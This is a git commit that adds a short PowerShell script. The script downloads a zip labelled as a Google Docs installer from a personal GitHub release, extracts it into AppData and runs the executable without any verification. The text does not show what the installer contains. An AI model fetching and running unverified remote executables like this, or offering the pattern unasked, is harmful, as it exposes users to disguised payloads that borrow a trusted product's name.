f445c4b820ddd2bad293dcbc82e1cdf78ee18f72
doopyelephant <nolanqsp@gmail.com>
2026-06-22 07:11:03 -0400

    Add script to download, extract, and run Google Docs installer

---
+++ Download&Install.ps1
@@ -0,0 +1,6 @@
+$AppData = "$env:USERPROFILE\AppData\Local\GoogleDocs"
+$Release = "$AppData\InstallerRelease.zip"
+Invoke-WebRequest -Uri "https://github.com/doopyelephant/GoogleDocs/releases/download/v0.1.0-alpha/GoogleDocsInstaller-windows-x64.zip" -OutFile "$Release"
+Expand-Archive -Path $Release -DestinationPath "$AppData\InstallerRelease"
+Remove-Item -Force $Release
+& "$AppData\InstallerRelease\GoogleDocsInstaller"
